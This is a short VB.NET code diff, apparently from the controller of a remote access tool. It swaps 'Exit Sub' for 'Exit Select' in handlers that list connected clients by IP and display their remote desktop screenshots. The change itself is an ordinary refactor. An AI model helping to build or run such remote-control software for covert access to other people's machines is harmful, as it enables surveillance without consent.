@@ -19,7 +19,7 @@
                         C.L.SubItems.Add(0)
                         F.LV1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                     End If
-                    Exit Sub
+                    Exit Select
 
                 Case "RD-"
                     If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
@@ -33,13 +33,12 @@
                             RD.Show()
                         End If
                     End If
-                    Exit Sub
+                    Exit Select
 
                 Case "RD+"
                     If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                         Dim RD As RemoteDesktop = My.Application.OpenForms("RD" + C.IP)
                         If RD IsNot Nothing Then
-
                             RD.Text = " Remote Desktop " + C.IP.Split(":")(0) + " [" + _Size(b.LongLength) + "]"
                             Using MM As IO.MemoryStream = New IO.MemoryStream(Text.Encoding.Default.GetBytes(A(1)))
                                 RD.PictureBox1.Image = Image.FromStream(MM)
@@ -55,7 +54,7 @@
 
                         End If
                     End If
-                    Exit Sub
+                    Exit Select
 
             End Select
             Exit Sub
